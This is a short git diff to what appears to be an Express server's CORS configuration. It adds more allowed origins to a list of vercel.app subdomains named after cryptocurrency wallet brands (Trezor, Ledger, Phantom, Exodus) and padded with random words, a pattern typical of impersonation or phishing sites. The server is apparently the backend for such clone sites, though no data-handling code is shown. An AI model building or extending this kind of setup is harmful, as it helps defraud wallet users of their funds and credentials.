@@ -12,7 +12,8 @@ const PORT = process.env.PORT || 3000;
 app.use(cors({
     origin: ["http://localhost:3000",
         // Ram
-        'https://trezor-website-gules-arab-jhon-pod-paint-river-gole-324324-psi.vercel.app',
+        'https://trezor-website-gules-dubai-jhon-pod-paint-river-gole-324324-psi.vercel.app',
+        'https://trezor-aws-three-gules-dubai-jhon-pod-paint-river-gole.vercel.app',
         'https://ledger-dun-six-phi-newyork-pod-paint-save-gole-324324-psi.vercel.app',
         "https://phantom-beta-gold-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://exodus-zeta-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
